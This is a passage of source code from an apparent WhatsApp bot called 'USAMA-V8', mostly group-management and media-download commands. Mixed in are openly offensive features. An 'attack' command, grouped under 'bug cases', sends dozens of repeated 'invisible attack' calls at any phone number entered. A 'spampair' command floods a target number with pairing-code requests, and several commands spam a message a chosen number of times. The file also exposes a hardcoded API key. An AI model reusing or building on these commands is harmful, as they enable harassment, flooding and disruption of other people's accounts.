                if (!isBotAdmins) return reply(mess.botAdmin)
                Usama.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
                break
            case 'totag':
                if (!m.isGroup) return reply(mess.group)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (!isAdmins) return reply(mess.admin)
                if (!m.quoted) return reply(`Reply messages with captions ${prefix + command}`)
                Usama.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
                break
            case 'group':
            case 'grup':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[0] === 'close') {
                    await Usama.groupSettingUpdate(m.chat, 'announcement').then((res) => reply(`Success In Closing The Group 🕊️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'open') {
                    await Usama.groupSettingUpdate(m.chat, 'not_announcement').then((res) => reply(`Success In Opening The Group 🕊️`)).catch((err) => reply(json(err)))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}open/close`)
                }
                break
            case 'editinfo':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                if (args[0] === 'open') {
                    await Usama.groupSettingUpdate(m.chat, 'unlocked').then((res) => reply(`Successfully Opened Group Edit Info 🕊️`)).catch((err) => reply(json(err)))
                } else if (args[0] === 'close') {
                    await Usama.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Successfully Closed Group Edit Info🕊️`)).catch((err) => reply(json(err)))
                } else {
                    reply(`Mode ${command}\n\n\nType ${prefix + command}on/off`)
                }
                break
            case 'linkgroup':
            case 'grouplink':
            case 'linkgrup':
            case 'linkgc':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                let response = await Usama.groupInviteCode(m.chat)
                Usama.sendText(m.chat, `👥 *GROUP LINK INFO*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Group Owner :* ${groupMetadata.owner !== undefined ? '@' + groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
                break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return reply(mess.group)
                if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin)
                if (!isBotAdmins) return reply(mess.botAdmin)
                await Usama.groupRevokeInvite(m.chat)
                    .then(res => {
                        reply(`Successful Reset, Group Invite Link ${groupMetadata.subject}`)
                    }).catch((err) => reply(json(err)))
                break
                case 'p':
            case 'ping':            
                reply(`
Runtime : ${runtime(process.uptime())}
Speed : _high level speed_
`)
            break
            
            case 'runtime':
                await reply(`Bots Have Been Running For ${runtime(process.uptime())}`)
                
                break
            case 'sc':
            case 'script':
            case 'scriptbot':
                Usama.sendMessage(m.chat, {
                    text: `Text Owner....!`,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `Contact owner to buy USAMA-V8.`,
                            thumbnailUrl: 'https://files.catbox.moe/oolnnr.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
            

            
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await Usama.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    Usama.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return reply(`Reply sticker with caption *${prefix + command}*`)
                reply(mess.wait)
                let media = await Usama.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await Usama.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into audio with caption ${prefix + command}`)
                reply(mess.wait)
                let media = await Usama.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Usama.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio that you want to make into MP3 with caption ${prefix + command}`)
                reply(mess.wait)
                let media = await Usama.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                Usama.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `usama.mp3`
                }, {
                    quoted: m
                })

            }
            break
            
            case 'tourl': {
                reply(mess.wait)
                let media = await Usama.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    reply(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return reply(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return reply(`Example : ${prefix + command} 😅+🤔`)
                reply(mess.wait)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await Usama.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.author,
                        categories: res.tags
                    })
                    await fs.unlinkSync(encmedia)
                }
            }
            break
            
            case 'toqr': {
                if (!q) return reply(' Please include link or text!')
                const QrCode = require('qrcode-reader')
                const qrcode = require('qrcode')
                let qyuer = await qrcode.toDataURL(q, {
                    scale: 35
                })
                let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
                let buff = getRandom('.jpg')
                await fs.writeFileSync('./' + buff, data)
                let medi = fs.readFileSync('./' + buff)
                await Usama.sendMessage(from, {
                    image: medi,
                    caption: "Here you go!"
                }, {
                    quoted: m
                })
                setTimeout(() => {
                    fs.unlinkSync(buff)
                }, 10000)
            }
            break
            
            case 'addowner':
                if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Usama.onWhatsApp(bnnd)
if (ceknye.length == 0) return reply(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
                if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Use ${prefix+command} nomor\nExample ${prefix+command} 916909137213`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
reply(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break


case 'play': {
    try {
        if (!q) return await reply("🚨 *Please provide a YouTube URL or song name!*");

        await Usama.sendMessage(from, { react: { text: '⏳', key: m.key } });

        const yt = await ytsearch(q);
        if (yt.results.length < 1) return reply("❌ *No results found!*");

        let yts = yt.results[0];  

        let ytmsg = `
🎬 *ΥσυΤυɓє Μє∂ια Ƒσυη∂!*  

📌 *Τιτℓє:* ${yts.title} 
⏳ *∂υяαтιση:* ${yts.timestamp || "N/A"}  
📅 *ρυɓℓιѕнє∂:* ${yts.ago || "N/A"}  
🔗 *URL:* ${yts.url}  

💾 *¢нσσѕє αη σρтιση:*  
1️⃣ *∂σωηℓσα∂ Vι∂єσ* 🎥  
2️⃣ *∂σωηℓσα∂ Aυ∂ισ* 🎶
`;
        const sentMessage = await Usama.sendMessage(from, {
            image: { url: yts.thumbnail || 'https://i.ytimg.com/vi/' + yts.videoId + '/hqdefault.jpg' },
            caption: ytmsg,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true
            }
        });

        const messageID = sentMessage.key.id;

        Usama.ev.on("messages.upsert", async message => {
            const receivedMessage = message.messages[0];
            if (!receivedMessage.message) return;

            const userResponse = receivedMessage.message.conversation || 
                                 receivedMessage.message.extendedTextMessage?.text;
            const chatID = receivedMessage.key.remoteJid;
            const isReplyToBotMessage = receivedMessage.message.extendedTextMessage &&
                                        receivedMessage.message.extendedTextMessage.contextInfo.stanzaId === messageID;

            if (isReplyToBotMessage) {
                await Usama.sendMessage(chatID, { react: { text: "🔄", key: receivedMessage.key } });

                let apiUrl, fileType, fileName, captionText;

                if (userResponse === "1") {
                    apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(yts.url)}`;
                    fileType = "video/mp4";
                    fileName = `${yts.title}.mp4`;
                    captionText = "🎥 *Your video is ready!* 🔥";
                } else if (userResponse === "2") {
                    apiUrl = `https://apis.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(yts.url)}`;
                    fileType = "audio/mp4";
                    fileName = `${yts.title}.mp3`;
                    captionText = `🎵 *Now Playing:* _${yts.title}_\n🎧 *Enjoy!*`;
                } else {
                    return reply("❌ *Invalid choice!* Reply with 1️⃣ for video or 2️⃣ for audio.");
                }

                let data, maxRetries = 5;
                for (let i = 0; i < maxRetries; i++) {
                    try {
                        let response = await fetch(apiUrl);
                        data = await response.json();

                        if (data.status === 200 && data.success && data.result.download_url) break;
                    } catch (e) {
                        console.log(`Retrying... (${i + 1}/${maxRetries})`);
                        await reply(`
*Downloading Video .............*
> _\`Retrying=(${i + 1}/${maxRetries})\`_`);
                    }
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }

                if (!data || data.status !== 200 || !data.success || !data.result.download_url) {
                    return reply("🚫 *Download failed! Please try again later.*");
                }

                if (userResponse === "1") {
                    await Usama.sendMessage(chatID, {
                        video: { url: data.result.download_url },
                        mimetype: fileType,
                        caption: captionText
                    }, { quoted: receivedMessage });
                } else {
                    await Usama.sendMessage(chatID, {
                        audio: { url: data.result.download_url },
                        mimetype: fileType,
                        fileName: fileName,
                        caption: captionText
                    }, { quoted: receivedMessage });
                }

                await Usama.sendMessage(chatID, { react: { text: "✅", key: receivedMessage.key } });
            }
        });

    } catch (e) {
        console.log(e);
        reply("⚠️ *An error occurred! Please try again later.*");
    }
};  
break;
















case 'fb': {
  try {
    if (!q || !q.startsWith("https://")) {
      return reply("🚨 *Please provide a valid Facebook video URL!*");
    }

    await Usama.sendMessage(from, { react: { text: '⏳', key: m.key } });

    const apiUrl = `https://lance-frank-asta.onrender.com/api/downloader?url=${encodeURIComponent(q)}`;
    let response, videoData;
    
    // Maximum retries for API request
    for (let i = 0; i < 3; i++) {
      try {
        response = await axios.get(apiUrl);
        let data = response.data;

        if (data?.content?.status && data?.content?.data?.result?.length) {
          videoData = data.content.data.result.find(v => v.quality === "HD") || 
                      data.content.data.result.find(v => v.quality === "SD");
          if (videoData) break;
        }
      } catch (e) {
        console.log(`Retrying... (${i + 1}/3)`);
        await new Promise(res => setTimeout(res, 3000));
      }
    }

    if (!videoData) {
      throw new Error("No valid video URL found.");
    }

    await Usama.sendMessage(from, {
      video: { url: videoData.url },
      caption: `
🎥 ƒα¢євσσк νι∂єσ ∂σωηℓσα∂є∂!  

💾 qυαℓιту: ${videoData.quality || "Unknown"}  
🌐 ѕσυя¢є: ƒα¢євσσк  

📢 ву 𝐔𝐒𝐀𝐌𝐀-𝐌𝐃 🚀
`
    }, { quoted: m });

    await Usama.sendMessage(from, { react: { text: '✅', key: m.key } });

  } catch (error) {
    console.error("FB Download Error:", error);

    // Bot owner ko sirf API ya critical error bhejne ka logic
    if (error.message.includes("API") || error.message.includes("No valid video")) {
      const ownerNumber = Usama.user.id.split(":")[0] + "@s.whatsapp.net";
      await Usama.sendMessage(ownerNumber, {
        text: `⚠️ *FB Downloader Error!*\n\n📍 *Group/User:* ${from}\n💬 *Query:* ${q}\n❌ *Error:* ${error.message}`
      });
    }

    // User ko safe error message bhejna
    reply("❌ *Error:* Unable to download video. Please try again later.");
  }
};
break;


case 'tt' : {
    try {
        if (!q) return reply("❌ Please provide a TikTok video link.");
        if (!q.includes("tiktok.com")) return reply("🚫 Invalid TikTok link.");
        
        await Usama.sendMessage(from, { react: { text: '⏳', key: m.key } });
        
        const apiUrl = `https://delirius-apiofc.vercel.app/download/tiktok?url=${q}`;
        const { data } = await axios.get(apiUrl);
        
        if (!data.status || !data.data) return reply("⚠️ Failed to fetch TikTok video.");
        
        const { title, like, comment, share, author, meta } = data.data;
        const videoUrl = meta.media.find(v => v.type === "video").org;
        
        const caption = `
🎥 тιктσк νι∂єσ ∂σωηℓσα∂є∂!  

👤 αυтнσя: ${author}
❤️ ℓιкєѕ: ${like}
💬 ¢σммєηтѕ: ${comment}
🔄 ѕнαяєѕ: ${share}

🎯 ву 𝐔𝐒𝐀𝐌𝐀-𝐌𝐃 🚀
`;
        
        await Usama.sendMessage(from, {
            video: { url: videoUrl },
            caption: caption,
            contextInfo: { mentionedJid: [m.sender] }
        }, { quoted: m });
        
        await Usama.sendMessage(from, { react: { text: '✅', key: m.key } });
        
    } catch (e) {
        console.error("Error in TikTok downloader command:", e);
        reply(`⚠️ An error occurred: ${e.message}`);
    }
};
break;            
            
            
            
            


//bug cases

case 'attack' :
case 'attack2' :
if (!isCreator) return reply (`
*「 ACCESS DENIED 」*

Tum is command ko use nahi kar sakte.
Yeh feature sirf authorized users ke liye hai.

Agar access chahiye toh contact karo owner se.
Rules simple hain — ya to permission lo, ya back jao.
`)
if (!iq) return reply(`
Command theek lgao yar
Example : ${command} 923×××××
`)
    let target = q.replace(/\D/g, '') + '@s.whatsapp.net';

await reply(`
*Sending invisible attack to ${target}*
`)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await sleep(2000)
await arka3(target, true)
await arka1(target, true)
await sleep(2000)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)
await arka1(target, true)
await arka2(target, true)
await arka3(target, true)
await sleep(2000)

await reply(`
SuccessFull Attack to ${target}
`)
console.log(chalk.red.bold(`Successfully fucked ${target} by USAMA-V8.`))
break

 case 'love': {
    if (!args[0]) return reply(`
💌 *Yααя, єк αмσυηт тσн ℓιкн ∂σ ηα!* 🤨  
`);

    let amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) return reply('🤦 *Bhai! Sahi amount likho na!* 🙄\n\n_Kitni baar likhna hai?_ 😍');


    for (let i = 1; i <= amount; i++) {
        await Usama.sendMessage(from, { text: `💌 *"𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄 😘❤️"*` });
    }
}
break;
    
    
case 'send': {
    if (!args[0] || !args[1]) return reply(`
✉️ *Bhai! Pehle message aur phir amount likho.*  
_Example:_ *send I miss you 5*
`);

    let amount = parseInt(args[args.length - 1]);
    if (isNaN(amount) || amount <= 0) return reply('⚠️ *Sahi amount likho bhai!*');

    let textToSend = args.slice(0, -1).join(' ');

    for (let i = 1; i <= amount; i++) {
        await Usama.sendMessage(from, { text: textToSend });
    }
}
break;
    
    
    
    
case 'naraaz': {
    if (!args[0]) return reply(`
😠 *Bнαι, кσι αмσυηт тσн ℓιкнσ!* 🤨  

_Кιтηι вααя ηαяααzgι ∂ιкнαηι нαι?_ 💔
`);

    let amount = parseInt(args[0]);
    if (isNaN(amount) || amount <= 0) return reply('🤦 *Yaar, sahi amount likho!* 😒\n\n_Kitni baar "Naraaz" likhna hai?_ 😞');

    for (let i = 1; i <= amount; i++) {
        await Usama.sendMessage(from, { text: `💔 *"𝙸 𝙰𝙼 𝙽𝙰𝚁𝙰𝙰𝙰𝚉 😞💔"*` });
    }
}
break;
                        

case 'spampair': {
 
const usePairingCode = true
const resolveMsgBuffer = new NodeCache()
			 
                if (!isCreator) return
			if (!q) return reply(`*Syntax Error!*\n\n_Use : Spampair NUMBER|AMOUNT_\n_Example : Spampair 234xx`) 
			let [peenis, pepekk = "20"] = q.split("|")
			await reply(`</> SUCCESSFULLY SPAMMING CODES`)
			await Usama.sendMessage(m.chat, { react: { text: `💫`, key: m.key }})
			let target = peenis.replace(/[^0-9]/g, '').trim()
			let {
				default: makeWaSocket,
				useMultiFileAuthState,
				fetchLatestBaileysVersion
			} = require('@whiskeysockets/baileys')
			let {
				state
			} = await useMultiFileAuthState('pairspam')
			let {
				version
			} = await fetchLatestBaileysVersion()
			let sucked = await makeWaSocket({
				auth: state,
				browser: ['Mac Os', 'chrome', '121.0.6167.159'],
version: [2, 2413, 1],
keepAliveIntervalMs: 50000,
printQRInTerminal: !usePairingCode,
generateHighQualityLinkPreview: true,
resolveMsgBuffer,
				logger: pino({ level: "silent" }),
					level: 'fatal'
				})
			for (let i = 0; i < pepekk; i++) {
			await sleep(2000)
				let prc = await sucked.requestPairingCode(target)
				await console.log(`Success Spam Pairing Code - Number : ${target} - Code : ${prc}`)
			}
			await sleep(2000)
		}
break


case 'del-bot': {
    if (!isCreator) return reply(`🚫 *α¢¢єѕѕ ∂єηιє∂!* 🚫  

💡 *σσρѕ! уσυ αяє ησт αℓℓσωє∂ тσ υѕє тнιѕ ¢σммαη∂.*  
🔥 тнιѕ ƒєαтυяє ιѕ *єх¢ℓυѕινє* ƒσя ρяємιυм υѕєяѕ σηℓу.  

🛒 *ωαηт α¢¢єѕѕ?* ¢σηтα¢т тнє *σωηєя:*  
📩 *∂м:* υѕαмα∂нυ∂∂ι  
💰 *вυу ρяємιυм* & υηℓσ¢к єχ¢ℓυѕινє ƒєαтυяєѕ!`);
    if (!q) return reply(`Example:\n ${prefix + command} 923###`);

    let target = text.split("|")[0]; // Ensure we get only the first part
    let sjid = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : target.replace(/[^0-9]/g,'') + "@s.whatsapp.net"; // Ensure correct format

    console.log("Deleting user:", sjid); // Debugging

    var contactInfo = await Usama.onWhatsApp(sjid);
    if (!contactInfo || contactInfo.length == 0) {
        return reply("❌ This number is not registered on WhatsApp.");
    }

    const sessionPath = `./lib/pairing/${sjid}`;

    const deleteUserSession = (folderPath) => {
        if (fs.existsSync(folderPath)) {
            fs.readdirSync(folderPath).forEach(file => {
                const curPath = path.join(folderPath, file);
                fs.lstatSync(curPath).isDirectory() ? deleteUserSession(curPath) : fs.unlinkSync(curPath);
            });
            fs.rmdirSync(folderPath);
            console.log(chalk.green(`✅ Successfully deleted session for: ${sjid}`));
        } else {
            console.log(chalk.red(`❌ No session found for: ${sjid}`));
        }
    };

    try {
        deleteUserSession(sessionPath);
        await reply(`
✅ *вσт α¢¢єѕѕ яємσνє∂ ѕυ¢¢єѕѕƒυℓℓу!* 🚀  

🛑 *тαяgєт:* ${sjid}  
👤 *яємσνє∂ ву:* υѕαмα ∂нυ∂∂ι`);
    } catch (err) {
        console.error(chalk.red(`❌ Error deleting session for: ${sjid}`), err);
        await reply(`❌ Failed to remove  bot access ${sjid}. Please try again.`);
    }
}
break;
    
    
    
    
    
    
    

    
    
case 'del-all-bot': { if (!isCreator) return reply(`🚫 *α¢¢єѕѕ ∂єηιє∂!* 🚫  

💡 *σσρѕ! уσυ αяє ησт αℓℓσωє∂ тσ υѕє тнιѕ ¢σммαη∂.*  
🔥 тнιѕ ƒєαтυяє ιѕ *єх¢ℓυѕινє* ƒσя ρяємιυм υѕєяѕ σηℓу.  

🛒 *ωαηт α¢¢єѕѕ?* ¢σηтα¢т тнє *σωηєя:*  
📩 *∂м:* υѕαмα∂нυ∂∂ι  
💰 *вυу ρяємιυм* & υηℓσ¢к єχ¢ℓυѕινє ƒєαтυяєѕ!`);

const sessionPath = './lib/pairing/';

const deleteAllSessions = (folderPath) => {
    if (fs.existsSync(folderPath)) {
        fs.readdirSync(folderPath).forEach(file => {
            const curPath = path.join(folderPath, file);
            fs.lstatSync(curPath).isDirectory() ? deleteAllSessions(curPath) : fs.unlinkSync(curPath);
        });
        fs.rmdirSync(folderPath, { recursive: true });
        console.log(chalk.green('✅ Successfully deleted all bot sessions.'));
    } else {
        console.log(chalk.red('❌ No bot sessions found to delete.'));
    }
};

try {
    deleteAllSessions(sessionPath);
    fs.mkdirSync(sessionPath, { recursive: true }); // Recreate the directory
    await reply(`

✅ αℓℓ вσт ѕєѕѕισиѕ нανє вєєи ∂єℓєтє∂ ѕυ¢¢єѕѕƒυℓℓу! 🚀`);
 } 
 catch (err) 
 { console.error(chalk.red('❌ Error deleting all bot sessions:'), err);
  await reply(`❌ ƒαιℓє∂ тσ ∂єℓєтє αℓℓ вσт ѕєѕѕισиѕ. ρℓєαѕє тяу αgαιи.`);
   }
    } break;
    
    
    case 'add-bot': {
	if (!isCreator) {return reply(`
🚫 *α¢¢єѕѕ ∂єηιє∂!* 🚫  

💡 *σσρѕ! уσυ αяє ησт αℓℓσωє∂ тσ υѕє тнιѕ ¢σммαη∂.*  
🔥 тнιѕ ƒєαтυяє ιѕ *єх¢ℓυѕινє* ƒσя ρяємιυм υѕєяѕ σηℓу.  

🛒 *ωαηт α¢¢єѕѕ?* ¢σηтα¢т тнє *σωηєя:*  
📩 *∂м:* υѕαмα∂нυ∂∂ι  
💰 *вυу ρяємιυм* & υηℓσ¢к єχ¢ℓυѕινє ƒєαтυяєѕ!`); }
	
if (!q) return reply(`Example:\n ${prefix + command} 923###`)
let target = text.split("|")[0]
sjid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : target.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await Usama.onWhatsApp(sjid);
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
const startpairing = require('./rentbot.js');
await startpairing(sjid);
await sleep(4000)
const cu = fs.readFileSync('./lib/pairing/pairing.json', 'utf-8');
const cuObj = JSON.parse(cu);
await Usama.sendMessage(from, { text:`${cuObj.code}`})
await Usama.sendMessage(from, { text:`Is code ko istemal kro or enjoy kro free access........!`})
}
break;




case 'list': {
if (!isCreator) return reply(`
🚫 *α¢¢єѕѕ ∂єηιє∂!* 🚫  

💡 *σσρѕ! уσυ αяє ησт αℓℓσωє∂ тσ υѕє тнιѕ ¢σммαη∂.*  
🔥 тнιѕ ƒєαтυяє ιѕ *єх¢ℓυѕινє* ƒσя ρяємιυм υѕєяѕ σηℓу.  

🛒 *ωαηт α¢¢єѕѕ?* ¢σηтα¢т тнє *σωηєя:*  
📩 *∂м:* υѕαмα∂нυ∂∂ι  
💰 *вυу ρяємιυм* & υηℓσ¢к єχ¢ℓυѕινє ƒєαтυяєѕ!
`)
    try {
        const pairingPath = './lib/pairing';

        // Check if directory exists
        if (!fs.existsSync(pairingPath)) {
            return Usama.sendMessage(from, { text: '❌ *No pairing data found!*' }, { quoted: m });
        }

        // Read all files in the directory
        const allFiles = fs.readdirSync(pairingPath);

        // Filter only files ending with ".whatsapp.net"
        const whatsappFiles = allFiles.filter(file => file.endsWith('whatsapp.net'));

        if (whatsappFiles.length === 0) {
            return Usama.sendMessage(from, { text: 'ℹ️ *No paired WhatsApp files found.*' }, { quoted: m });
        }

        // Formatting the list
        let pairedList = `📂 *Paired WhatsApp Devices:*\n\n`;
        whatsappFiles.forEach((file, index) => {
            pairedList += `📌 ${index + 1}. ${file}\n`;
        });

        pairedList += `\n📊 *Total Paired Devices:* ${whatsappFiles.length}`;

        Usama.sendMessage(from, { text: pairedList }, { quoted: m });

    } catch (err) {
        console.error('Error fetching paired devices:', err);
        await reply('⚠️ *An error occurred while fetching paired devices.*');
    }
}
break;



case "add-creator": {
    if (!isCreator) return reply("❌ اجازت نہیں ہے!");

    if (!q && !m.quoted && (!m.mentionedJid || m.mentionedJid.length === 0)) {
        return reply(`📌 ایسے لکھیں اور ایڈ کریں:  
        add-creator @mention  
        add-creator 92xxxxxxx`);
    }

    let target = "";
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid && m.mentionedJid.length > 0) {
        target = m.mentionedJid[0];
    } else {
        target = q.replace(/[^0-9]/g, "");
    }

    const creatorDb = require("./Creator.js");
    if (creatorDb.includes(target)) {
        return reply("✅ یہ نمبر پہلے سے Creator لسٹ میں موجود ہے!");
    }

    creatorDb.push(target);
    fs.writeFileSync("./Creator.js", `module.exports = ${JSON.stringify(creatorDb, null, 2)};`);

    reply(`🎉 کامیابی: نمبر ${target} Creator لسٹ میں شامل ہوگیا!`);
}
break;    

case "del-creator": {
    if (!isCreator) return reply("❌ *تمہیں اجازت نہیں ہے!*");

    if (!q && !m.quoted) {
        return reply(`📌 *ایسے لکھو اور نمبر ہٹاؤ:*  
        ✨ *del-creator 92xxxxxxx*`);
    }

    let target;
    if (m.quoted) {
        target = m.quoted.sender;
    } else if (m.mentionedJid && m.mentionedJid.length > 0) {
        target = m.mentionedJid[0];
    } else {
        target = args[0].replace(/[^0-9]/g, "");
    }

    let creatorDb = require("./Creator.js");
    if (!creatorDb.includes(target)) {
        return reply("⚠️ *یہ نمبر Creator لسٹ میں موجود نہیں!*");
    }

    creatorDb = creatorDb.filter(num => num !== target);
    fs.writeFileSync("./Creator.js", `module.exports = ${JSON.stringify(creatorDb, null, 2)};`);

    reply(`✅ *کامیابی!*  
📌 نمبر *${target}* کو Creator لسٹ سے ہٹا دیا گیا!`);
}
break;


case 'menu' : 
await loading ()
let menutext = `
╭━[ 𝗨𝗦𝗔𝗠𝗔 ⱽ𝟴 ]━╮
┃
┃ 𝙾𝚆𝙽𝙴𝚁:
┃  *✦ υѕαмα ✦*
╰━━━━━━━━━━╯

𝐇𝐞𝐥𝐥𝐨 @${pushname}
${readmore}
╭──⟪ 𝘽𝙐𝙂 ⟫──╮
│ ᴀᴛᴛᴀᴄᴋ
│ ᴀᴛᴛᴀᴄᴋ2
╰──────────╯

╭─⟪ 𝙊𝙒𝙉𝙀𝙍 ⟫─╮
│ ᴊᴏɪɴ
│ sʜᴜᴛᴅᴏᴡɴ
│ ʀᴇsᴛᴀʀᴛ
│ ᴀᴜᴛᴏʀᴇᴀᴅ
│ ᴀᴜᴛᴏᴛʏᴘɪɴɢ
│ ᴀᴜᴛᴏʀᴇᴄᴏʀᴅɪɴɢ
│ ᴀᴜᴛᴏsᴛᴀᴛᴜsᴠɪᴇᴡ
│ ᴍᴏᴅᴇ
│ ʙʟᴏᴄᴋ 
│ ᴜɴʙʟᴏᴄᴋ
│ ᴀᴅᴅᴏᴡɴᴇʀ 
│ ᴅᴇʟᴏᴡɴᴇʀ
╰──────────╯

╭─⟪ 𝙂𝙍𝙊𝙐𝙋 ⟫─╮
│ ᴋɪᴄᴋ 
│ ᴀᴅᴅ
│ ᴘʀᴏᴍᴏᴛᴇ 
│ ᴅᴇᴍᴏᴛᴇ
│ sᴇᴛᴅᴇsᴄ 
│ sᴇᴛᴘᴘɢᴄ
│ ʟɪɴᴋɢᴄ
│ ᴛᴀɢᴀʟʟ 
│ ʜɪᴅᴇᴛᴀɢ
╰──────────╯

╭─⟪ 𝙏𝙊𝙊𝙇𝙎 ⟫─╮
│ ʀᴜɴᴛɪᴍᴇ
│ sᴄʀɪᴘᴛ 
